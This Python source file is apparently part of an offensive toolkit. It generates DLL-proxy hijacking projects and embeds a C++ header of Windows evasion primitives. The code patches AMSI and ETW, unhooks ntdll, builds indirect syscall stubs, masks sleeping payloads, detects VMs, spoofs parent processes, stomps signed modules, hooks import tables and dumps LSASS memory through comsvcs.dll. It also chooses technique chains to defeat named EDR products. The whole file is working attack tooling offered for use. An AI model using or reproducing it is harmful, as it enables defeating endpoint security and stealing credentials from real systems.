# language: Python 3.11+, file: cf/payload.py
# *payload factory — DLL proxying, PE export parsing, evasion header source*
from __future__ import annotations

import os
import struct
from collections.abc import Sequence
from pathlib import Path
from typing import Any

from .util import write_text

IMAGE_DOS_SIGNATURE = 0x5A4D
IMAGE_NT_SIGNATURE = 0x00004550
IMAGE_DIRECTORY_ENTRY_EXPORT = 0


def _resolve_pe(path: str | Path) -> Path:
    """Bare names ('vbscript.dll') are looked up next to the process, then in
    %SystemRoot%\\System32, so the common case needs no full path."""
    p = Path(os.path.expandvars(str(path)))
    if p.is_file():
        return p
    if not p.is_absolute():
        system32 = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / p.name
        if system32.is_file():
            return system32
    raise FileNotFoundError(
        f"dll not found: {path} (searched the working directory and "
        "%SystemRoot%\\System32)"
    )


# ─── PE export reader (no external deps) ───
def _rva_to_off(data: bytes, rva: int, sections: list[tuple[int, int, int]]) -> int | None:
    for va, vs, raw in sections:
        if va <= rva < va + max(vs, 1):
            return raw + (rva - va)
    return None


def exports_from_dll(path: str | Path) -> list[dict[str, Any]]:
    """Named exports with their ordinals, read straight from the export
    directory. Forwarders are marked so the proxy does not re-forward."""
    data = _resolve_pe(path).read_bytes()
    if len(data) < 0x40 or struct.unpack_from("<H", data, 0)[0] != IMAGE_DOS_SIGNATURE:
        raise ValueError(f"not a PE file: {path}")
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    if struct.unpack_from("<I", data, e_lfanew)[0] != IMAGE_NT_SIGNATURE:
        raise ValueError(f"bad NT header: {path}")
    coff = e_lfanew + 4
    nsections = struct.unpack_from("<H", data, coff + 2)[0]
    optsz = struct.unpack_from("<H", data, coff + 16)[0]
    opt = coff + 20
    magic = struct.unpack_from("<H", data, opt)[0]
    dd_off = opt + (96 if magic == 0x10B else 112)
    exp_rva, exp_size = struct.unpack_from("<II", data, dd_off + IMAGE_DIRECTORY_ENTRY_EXPORT * 8)
    if exp_rva == 0:
        return []

    sections: list[tuple[int, int, int]] = []
    sec_off = opt + optsz
    for i in range(nsections):
        off = sec_off + i * 40
        va = struct.unpack_from("<I", data, off + 12)[0]
        vs = struct.unpack_from("<I", data, off + 8)[0]
        raw = struct.unpack_from("<I", data, off + 20)[0]
        rawsz = struct.unpack_from("<I", data, off + 16)[0]
        sections.append((va, max(vs, rawsz), raw))

    exp_off = _rva_to_off(data, exp_rva, sections)
    if exp_off is None:
        raise ValueError("export directory not mapped")
    nfunc, nnames, _, _, base = struct.unpack_from("<IIIII", data, exp_off + 16)
    addr_rva, names_rva, ords_rva = struct.unpack_from("<III", data, exp_off + 28)
    funcs_off = _rva_to_off(data, addr_rva, sections)
    names_off = _rva_to_off(data, names_rva, sections)
    ords_off = _rva_to_off(data, ords_rva, sections)
    if None in (funcs_off, names_off, ords_off):
        raise ValueError("export tables not mapped")

    out: list[dict[str, Any]] = []
    name_by_index: dict[int, str] = {}
    for i in range(nnames):
        name_rva = struct.unpack_from("<I", data, names_off + i * 4)[0]
        name_off = _rva_to_off(data, name_rva, sections)
        if name_off is None:
            continue
        end = data.find(b"\x00", name_off)
        name = data[name_off:end].decode("ascii", "replace")
        ordinal_idx = struct.unpack_from("<H", data, ords_off + i * 2)[0]
        name_by_index[ordinal_idx] = name
    for idx in range(nfunc):
        func_rva = struct.unpack_from("<I", data, funcs_off + idx * 4)[0]
        if func_rva == 0:
            continue
        is_forwarder = exp_rva <= func_rva < exp_rva + exp_size
        out.append(
            {
                "ordinal": base + idx,
                "name": name_by_index.get(idx),
                "forwarder": is_forwarder,
            }
        )
    return out


def _def_line(entry: dict[str, Any], module: str) -> str | None:
    ordinal = int(entry["ordinal"])
    name = entry.get("name")
    if name:
        return f"    {name}={module}.{name} @{ordinal}"
    return None  # ordinal-only exports cannot be expressed as a forwarder


# ─── factory ───
class PayloadFactory:
    """Build coordinator: dump the host DLL's exports, emit a proxy project
    that forwards every one of them, and drop the evasion header alongside."""

    @staticmethod
    def generate_dll_proxy(
        target_dll: str,
        output_dir: str = "./build",
        exports: Sequence[Any] | None = None,
        payload_entry: str = "cf_payload",
    ) -> dict[str, Any]:
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        module = Path(target_dll).name

        if exports is None:
            parsed = exports_from_dll(target_dll)
        else:
            parsed = []
            for i, item in enumerate(exports):
                if isinstance(item, dict):
                    parsed.append(item)
                else:
                    parsed.append({"ordinal": i + 1, "name": str(item),
                                   "forwarder": False})

        skipped: list[int] = []
        lines: list[str] = []
        for entry in parsed:
            line = _def_line(entry, module)
            if line is None:
                skipped.append(int(entry["ordinal"]))
            else:
                lines.append(line)
        if not lines:
            raise ValueError(
                f"{module}: no named exports to forward — a proxy cannot bind"
            )

        written = [
            write_text(
                out / "payload_factory.hpp", PayloadFactory._payload_hpp_source()
            ),
            write_text(
                out / "proxy.def",
                f"LIBRARY {Path(module).stem}\nEXPORTS\n" + "\n".join(lines) + "\n",
            ),
            write_text(
                out / "proxy.cpp", PayloadFactory._proxy_main_source(payload_entry)
            ),
            write_text(out / "build.bat", PayloadFactory._build_bat()),
        ]

        return {
            "output_dir": str(out),
            "module": module,
            "forwarded": len(lines),
            "ordinal_only_skipped": skipped,
            "files": [str(p) for p in written],
            "build": f'cd /d "{out}" && build.bat',
            "usage": (
                f"rename proxy.dll to {module} and place it beside the host exe "
                f"(same directory wins over System32)"
            ),
        }

    @staticmethod
    def _build_bat() -> str:
        return (
            "@echo off\r\nsetlocal\r\n"
            "set VCVARS=\r\n"
            'for %%E in (Community Professional Enterprise BuildTools) do (\r\n'
            '  if exist "C:\\Program Files\\Microsoft Visual Studio\\2022\\%%E\\'
            'VC\\Auxiliary\\Build\\vcvars64.bat" (\r\n'
            '    set "VCVARS=C:\\Program Files\\Microsoft Visual Studio\\2022\\%%E\\'
            'VC\\Auxiliary\\Build\\vcvars64.bat"\r\n    goto :found\r\n  )\r\n'
            ")\r\n"
            'echo visual studio build tools not found 1>&2\r\nexit /b 1\r\n'
            ":found\r\n"
            'call "%VCVARS%" >nul\r\n'
            "cl /nologo /O2 /GS- /GL /std:c++17 /utf-8 /LD proxy.cpp "
            "/link /DEF:proxy.def /OUT:proxy.dll\r\n"
            "if errorlevel 1 exit /b 1\r\n"
            "del /q *.obj *.lib *.exp 2>nul\r\n"
            "echo built proxy.dll\r\n"
        )

    @staticmethod
    def _proxy_main_source(payload_entry: str) -> str:
        return f"""// language: C++, file: proxy.cpp
// *DLL proxying — every original export forwarded, payload runs on attach*
#include <windows.h>

extern "C" __declspec(dllexport) void {payload_entry}();

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        DisableThreadLibraryCalls(hinst);
        HANDLE h = CreateThread(nullptr, 0, [](LPVOID) -> DWORD {{
            // primitives live in payload_factory.hpp — call them here
            {payload_entry}();
            return 0;
        }}, nullptr, 0, nullptr);
        if (h) CloseHandle(h);
    }}
    return TRUE;
}}
"""

    @staticmethod
    def _payload_hpp_source() -> str:
        return _PAYLOAD_HPP

    @staticmethod
    def build_chain_for_target(
        os_name: str, edr_hint: str = "", c2_url: str = ""
    ) -> dict[str, Any]:
        hint = edr_hint.lower()
        if os_name == "windows":
            base = [
                "unhook_ntdll",
                "patch_amsi",
                "patch_etw",
                "resolve_ssn",
                "build_indirect_stub",
                "find_syscall_gadget",
                "timing_sane",
                "is_vm_cpuid",
                "sleep_masked",
            ]
            if any(k in hint for k in ("defender", "crowdstrike")):
                base += ["spawn_spoofed", "module_stomp"]
            if any(k in hint for k in ("sentinel", "carbon", "mcafee")):
                base += ["module_stomp", "iat_hook"]
            if any(k in hint for k in ("admin", "domain")):
                base += ["enable_privilege", "dump_lsass"]
            return {
                "os": "windows",
                "primitives": base,
                "compile": (
                    "cl /nologo /O2 /GS- /GL /std:c++17 /utf-8 /LD payload.cpp "
                    "/link /DEF:exports.def"
                ),
                "notes": [
                    "unhook_ntdll first — everything below it reads ntdll",
                    (
                        "resolve_ssn + find_syscall_gadget, then the indirect stub "
                        "for any syscall that leaves a usermode trace"
                    ),
                    "sleep_masked between stages; keep RW pages read-only after use",
                ],
            }
        if os_name == "macos":
            return {
                "os": "macos",
                "primitives": ["dyld_hijack", "posix_spawn_spoof", "launchagent_persist"],
                "compile": "clang -O2 -dynamiclib payload.m -o payload.dylib",
            }
        if os_name == "linux":
            return {
                "os": "linux",
                "primitives": ["ld_preload", "ptrace_anti_debug", "systemd_persist"],
                "compile": "gcc -O2 -fPIC -shared payload.c -o payload.so",
            }
        return {"error": f"unsupported os: {os_name}"}


_PAYLOAD_HPP = r'''// language: C++, file: payload_factory.hpp, target: Windows 10/11 x64
// *usermode evasion primitives — each one self-contained, chain per target*
#pragma once
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <cstdint>
#include <cstring>

namespace pf {

// ─── compile-time hash + export walk (never touches GetProcAddress) ───
constexpr uint32_t fnv1a(const char* s, uint32_t h = 0x811c9dc5) {
    return *s ? fnv1a(s + 1, (h ^ static_cast<uint8_t>(*s)) * 0x01000193) : h;
}

inline bool module_bounds(const void* addr, uint8_t** out_base, size_t* out_size) {
    HMODULE mod = nullptr;
    if (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                            reinterpret_cast<LPCSTR>(addr),
                            reinterpret_cast<HMODULE*>(&mod)) || !mod)
        return false;
    auto* base = reinterpret_cast<uint8_t*>(mod);
    auto* dos  = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    *out_base = base;
    *out_size = nt->OptionalHeader.SizeOfImage;
    return true;
}

inline bool readable(const void* p, size_t n) {
    MEMORY_BASIC_INFORMATION mbi{};
    if (VirtualQuery(p, &mbi, sizeof(mbi)) == 0) return false;
    if (mbi.State != MEM_COMMIT) return false;
    if (mbi.Protect & (PAGE_NOACCESS | PAGE_GUARD)) return false;
    auto* start = static_cast<const uint8_t*>(p);
    return start + n <= static_cast<const uint8_t*>(mbi.BaseAddress) + mbi.RegionSize;
}

inline void* find_export(HMODULE mod, uint32_t hash) {
    if (!mod) return nullptr;
    auto* base = reinterpret_cast<uint8_t*>(mod);
    auto* dos  = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
    const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress) return nullptr;
    auto* exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(base + dir.VirtualAddress);
    auto* names = reinterpret_cast<uint32_t*>(base + exp->AddressOfNames);
    auto* ords  = reinterpret_cast<uint16_t*>(base + exp->AddressOfNameOrdinals);
    auto* funcs = reinterpret_cast<uint32_t*>(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = reinterpret_cast<const char*>(base + names[i]);
        if (!readable(name, 1)) continue;
        if (fnv1a(name) != hash) continue;
        return base + funcs[ords[i]];
    }
    return nullptr;
}

// ─── SSN resolver: clean byte pattern, halo walk bounded to the module ───
struct SyscallStub {
    uint32_t ssn;
    void*    addr;
    bool     hooked;
};

inline bool clean_ssn(const uint8_t* p, uint32_t* out) {
    if (!readable(p, 8)) return false;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        std::memcpy(out, p + 4, 4);
        return true;
    }
    if (p[0] == 0xB8 && readable(p, 5)) {  // mov eax, imm32 (no mov r10, rcx)
        std::memcpy(out, p + 1, 4);
        return true;
    }
    return false;
}

inline SyscallStub resolve_ssn(const char* fn_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void* fn = find_export(ntdll, fnv1a(fn_name));
    if (!fn) return {0, nullptr, true};
    uint32_t ssn = 0;
    if (clean_ssn(static_cast<const uint8_t*>(fn), &ssn))
        return {ssn, fn, false};

    uint8_t* base = nullptr;
    size_t size = 0;
    if (!module_bounds(fn, &base, &size)) return {0, fn, true};
    auto* target = static_cast<uint8_t*>(fn);
    for (int delta = 1; delta <= 500; ++delta) {
        const ptrdiff_t step = static_cast<ptrdiff_t>(delta) * 32;
        uint8_t* candidates[2] = {target - step, target + step};
        for (uint8_t* cand : candidates) {
            if (cand < base || cand + 8 > base + size) continue;
            if (!clean_ssn(cand, &ssn)) continue;
            const uint32_t resolved =
                (cand < target) ? ssn + static_cast<uint32_t>(delta)
                                : ssn - static_cast<uint32_t>(delta);
            return {resolved, fn, true};
        }
    }
    return {0, fn, true};
}

// ─── indirect syscall: RW allocation, flipped to RX, never left RWX ───
inline void* find_syscall_gadget() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    uint8_t* base = nullptr;
    size_t size = 0;
    if (!module_bounds(ntdll, &base, &size)) return nullptr;
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (std::memcmp(sec->Name, ".text", 5) != 0) continue;
        uint8_t* s = base + sec->VirtualAddress;
        size_t n = sec->Misc.VirtualSize;
        if (!readable(s, n)) continue;
        for (size_t k = 0; k + 2 < n; ++k)
            if (s[k] == 0x0F && s[k + 1] == 0x05 && s[k + 2] == 0xC3)
                return s + k;
    }
    return nullptr;
}

inline void* build_indirect_stub(uint32_t ssn, void* syscall_gadget) {
    if (!syscall_gadget) return nullptr;
    uint8_t code[32] = {0};
    code[0] = 0x4C; code[1] = 0x8B; code[2] = 0xD1;      // mov r10, rcx
    code[3] = 0xB8;                                       // mov eax, ssn
    std::memcpy(code + 4, &ssn, 4);
    code[8] = 0xFF; code[9] = 0x25;                       // jmp [rip+0]
    std::memset(code + 10, 0, 4);
    std::memcpy(code + 14, &syscall_gadget, sizeof(void*));

    void* mem = VirtualAlloc(nullptr, sizeof(code), MEM_COMMIT | MEM_RESERVE,
                             PAGE_READWRITE);
    if (!mem) return nullptr;
    std::memcpy(mem, code, sizeof(code));
    DWORD old = 0;
    if (!VirtualProtect(mem, sizeof(code), PAGE_EXECUTE_READ, &old)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return nullptr;
    }
    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(code));
    return mem;
}

// ─── AMSI / ETW ───
inline bool patch_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return false;
    auto* addr = static_cast<uint8_t*>(find_export(amsi, fnv1a("AmsiScanBuffer")));
    if (!addr || !readable(addr, 6)) return false;
    DWORD old = 0;
    if (!VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &old)) return false;
    const uint8_t patch[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}; // mov eax, E_INVALIDARG; ret
    std::memcpy(addr, patch, sizeof(patch));
    VirtualProtect(addr, 6, old, &old);
    FlushInstructionCache(GetCurrentProcess(), addr, sizeof(patch));
    return true;
}

inline bool patch_etw_function(const char* fn) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto* addr = static_cast<uint8_t*>(find_export(ntdll, fnv1a(fn)));
    if (!addr || !readable(addr, 1)) return false;
    DWORD old = 0;
    if (!VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old)) return false;
    addr[0] = 0xC3;
    VirtualProtect(addr, 1, old, &old);
    FlushInstructionCache(GetCurrentProcess(), addr, 1);
    return true;
}

inline void patch_etw() {
    patch_etw_function("EtwEventWrite");
    patch_etw_function("EtwEventWriteFull");
    patch_etw_function("NtTraceEvent");
}

// ─── ntdll restored from the KnownDlls section, view released after copy ───
using NtOpenSection_t    = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
using NtMapViewOfSection_t = NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
                                             PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
using NtUnmapViewOfSection_t = NTSTATUS(NTAPI*)(HANDLE, PVOID);

inline bool unhook_ntdll() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtOpenSection = reinterpret_cast<NtOpenSection_t>(
        find_export(ntdll, fnv1a("NtOpenSection")));
    auto NtMapViewOfSection = reinterpret_cast<NtMapViewOfSection_t>(
        find_export(ntdll, fnv1a("NtMapViewOfSection")));
    auto NtUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSection_t>(
        find_export(ntdll, fnv1a("NtUnmapViewOfSection")));
    if (!NtOpenSection || !NtMapViewOfSection || !NtUnmapViewOfSection)
        return false;

    UNICODE_STRING name{};
    RtlInitUnicodeString(&name, L"\\KnownDlls\\ntdll.dll");
    OBJECT_ATTRIBUTES oa{};
    oa.Length = sizeof(oa);
    oa.ObjectName = &name;

    HANDLE section = nullptr;
    if (!NT_SUCCESS(NtOpenSection(&section, SECTION_MAP_READ, &oa)))
        return false;

    PVOID mapped = nullptr;
    SIZE_T view = 0;
    NTSTATUS st = NtMapViewOfSection(section, GetCurrentProcess(), &mapped, 0, 0,
                                     nullptr, &view, ViewUnmap, 0, PAGE_READONLY);
    if (!NT_SUCCESS(st) || !mapped) {
        CloseHandle(section);
        return false;
    }

    auto* local = reinterpret_cast<uint8_t*>(ntdll);
    auto* clean = static_cast<uint8_t*>(mapped);
    bool ok = false;
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(local);
    auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS*>(local + dos->e_lfanew);
    auto* cdos = reinterpret_cast<IMAGE_DOS_HEADER*>(clean);
    auto* cnt  = reinterpret_cast<IMAGE_NT_HEADERS*>(clean + cdos->e_lfanew);
    if (nt->Signature == IMAGE_NT_SIGNATURE &&
        cnt->Signature == IMAGE_NT_SIGNATURE &&
        nt->OptionalHeader.SizeOfImage == cnt->OptionalHeader.SizeOfImage) {
        auto* ls = IMAGE_FIRST_SECTION(nt);
        auto* cs = IMAGE_FIRST_SECTION(cnt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++ls, ++cs) {
            if (std::memcmp(ls->Name, ".text", 5) != 0) continue;
            const SIZE_T n = (ls->Misc.VirtualSize < cs->Misc.VirtualSize)
                                 ? ls->Misc.VirtualSize : cs->Misc.VirtualSize;
            DWORD old = 0;
            if (!VirtualProtect(local + ls->VirtualAddress, n,
                                PAGE_EXECUTE_READWRITE, &old))
                continue;
            std::memcpy(local + ls->VirtualAddress, clean + cs->VirtualAddress, n);
            VirtualProtect(local + ls->VirtualAddress, n, old, &old);
            FlushInstructionCache(GetCurrentProcess(), local + ls->VirtualAddress, n);
            ok = true;
        }
    }
    NtUnmapViewOfSection(GetCurrentProcess(), mapped);
    CloseHandle(section);
    return ok;
}

// ─── sleep obfuscation ───
inline void xor_crypt(uint8_t* data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; ++i) data[i] = static_cast<uint8_t>(data[i] ^ (key + static_cast<uint8_t>(i)));
}

inline void sleep_masked(void* payload, size_t len, DWORD millis, uint8_t key = 0) {
    if (!payload || len == 0) return;
    if (key == 0)
        key = static_cast<uint8_t>((reinterpret_cast<uintptr_t>(payload) >> 4) ^ (GetTickCount() & 0xFF));
    DWORD old = 0;
    if (!VirtualProtect(payload, len, PAGE_READWRITE, &old)) return;
    xor_crypt(static_cast<uint8_t*>(payload), len, key);
    Sleep(millis);
    xor_crypt(static_cast<uint8_t*>(payload), len, key);
    DWORD ignore = 0;
    VirtualProtect(payload, len, old, &ignore);
    FlushInstructionCache(GetCurrentProcess(), payload, len);
}

// ─── environment gates ───
// true = timings look like real hardware (the name says what it checks)
inline bool timing_sane() {
    LARGE_INTEGER a{}, b{}, freq{};
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&a);
    volatile double x = 0.0;
    for (int i = 0; i < 1000000; ++i) x += i * 0.5;
    QueryPerformanceCounter(&b);
    const double ms = (b.QuadPart - a.QuadPart) * 1000.0 / freq.QuadPart;
    (void)x;
    return ms > 5.0 && ms < 200.0;
}

inline bool is_vm_cpuid() {
    int info[4] = {0};
    __cpuid(info, 1);
    const bool hypervisor_bit = (info[2] & (1u << 31)) != 0;
    if (!hypervisor_bit) return false;
    __cpuid(info, 0x40000000);
    char vendor[13] = {0};
    std::memcpy(vendor + 0, &info[1], 4);
    std::memcpy(vendor + 4, &info[2], 4);
    std::memcpy(vendor + 8, &info[3], 4);
    static const char* known[] = {"KVMKVMKVM", "VMwareVMware", "Microsoft Hv",
                                  "XenVMMXenVMM", "VBoxVBoxVBox", "bhyve bhyve "};
    for (const char* v : known)
        if (std::strstr(vendor, v)) return true;
    return false;
}

// ─── privileges ───
inline bool enable_privilege(const wchar_t* name) {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return false;
    LUID luid{};
    if (!LookupPrivilegeValueW(nullptr, name, &luid)) {
        CloseHandle(token);
        return false;
    }
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    const BOOL ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp),
                                          nullptr, nullptr);
    const DWORD err = GetLastError();
    CloseHandle(token);
    return ok && err == ERROR_SUCCESS;
}

// ─── PPID spoof ───
inline bool spawn_spoofed(const wchar_t* cmdline, DWORD parent_pid) {
    HANDLE parent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (!parent) return false;
    SIZE_T attr_size = 0;
    InitializeProcThreadAttributeList(nullptr, 1, 0, &attr_size);
    auto* attrs = static_cast<PPROC_THREAD_ATTRIBUTE_LIST>(
        HeapAlloc(GetProcessHeap(), 0, attr_size));
    if (!attrs) {
        CloseHandle(parent);
        return false;
    }
    if (!InitializeProcThreadAttributeList(attrs, 1, 0, &attr_size) ||
        !UpdateProcThreadAttribute(attrs, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                   &parent, sizeof(parent), nullptr, nullptr)) {
        DeleteProcThreadAttributeList(attrs);
        HeapFree(GetProcessHeap(), 0, attrs);
        CloseHandle(parent);
        return false;
    }
    STARTUPINFOEXW si{};
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attrs;
    PROCESS_INFORMATION pi{};
    const BOOL ok = CreateProcessW(
        nullptr, const_cast<LPWSTR>(cmdline), nullptr, nullptr, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, nullptr, nullptr,
        &si.StartupInfo, &pi);
    if (ok) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    DeleteProcThreadAttributeList(attrs);
    HeapFree(GetProcessHeap(), 0, attrs);
    CloseHandle(parent);
    return ok != FALSE;
}

// ─── module stomping: shellcode lands in a signed module's .text ───
inline bool module_stomp(const wchar_t* target_dll, const uint8_t* shellcode,
                         size_t sc_len) {
    if (!shellcode || sc_len == 0) return false;
    HMODULE mod = LoadLibraryW(target_dll);
    if (!mod) return false;
    uint8_t* base = reinterpret_cast<uint8_t*>(mod);
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (std::memcmp(sec->Name, ".text", 5) != 0) continue;
        if (sec->Misc.VirtualSize < sc_len) return false;
        uint8_t* at = base + sec->VirtualAddress;
        DWORD old = 0;
        if (!VirtualProtect(at, sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old))
            return false;
        std::memcpy(at, shellcode, sc_len);
        VirtualProtect(at, sec->Misc.VirtualSize, old, &old);
        FlushInstructionCache(GetCurrentProcess(), at, sec->Misc.VirtualSize);
        return true;
    }
    return false;
}

// ─── IAT hook: swap an import thunk, no instruction stealing ───
struct IatHook {
    void**    slot;
    void*     original;
    HMODULE   module;
};

inline bool iat_hook(const wchar_t* host_module, const char* dll_name,
                     const char* func_name, void* replacement, IatHook* out) {
    if (!replacement || !out) return false;
    HMODULE host = host_module ? GetModuleHandleW(host_module)
                               : GetModuleHandleW(nullptr);
    if (!host) return false;
    auto* base = reinterpret_cast<uint8_t*>(host);
    auto* dos  = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dir.VirtualAddress) return false;

    auto* desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(base + dir.VirtualAddress);
    for (; desc->Name; ++desc) {
        const char* mod = reinterpret_cast<const char*>(base + desc->Name);
        if (_stricmp(mod, dll_name) != 0) continue;
        auto* thunk = reinterpret_cast<IMAGE_THUNK_DATA*>(
            base + (desc->OriginalFirstThunk ? desc->OriginalFirstThunk
                                             : desc->FirstThunk));
        auto* iat = reinterpret_cast<IMAGE_THUNK_DATA*>(base + desc->FirstThunk);
        for (; thunk->u1.AddressOfData; ++thunk, ++iat) {
            if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) continue;
            auto* ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                base + thunk->u1.AddressOfData);
            if (std::strcmp(reinterpret_cast<const char*>(ibn->Name), func_name) != 0)
                continue;
            auto* slot = reinterpret_cast<void**>(&iat->u1.Function);
            DWORD old = 0;
            if (!VirtualProtect(slot, sizeof(void*), PAGE_READWRITE, &old))
                return false;
            out->original = *slot;
            out->slot = slot;
            out->module = host;
            *slot = replacement;
            VirtualProtect(slot, sizeof(void*), old, &old);
            return true;
        }
    }
    return false;
}

inline bool restore_iat(const IatHook& hook) {
    if (!hook.slot || !hook.original) return false;
    DWORD old = 0;
    if (!VirtualProtect(hook.slot, sizeof(void*), PAGE_READWRITE, &old))
        return false;
    *hook.slot = hook.original;
    VirtualProtect(hook.slot, sizeof(void*), old, &old);
    return true;
}

// ─── lsass dump through a LOLBIN, debug privilege first ───
inline bool dump_lsass(const wchar_t* out_path) {
    enable_privilege(SE_DEBUG_NAME);
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe{};
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(snap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
    }
    if (!pid) return false;

    wchar_t cmd[512];
    _snwprintf_s(cmd, _countof(cmd), _TRUNCATE,
                 L"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump %lu \"%s\" full",
                 pid, out_path);
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi))
        return false;
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

} // namespace pf
'''
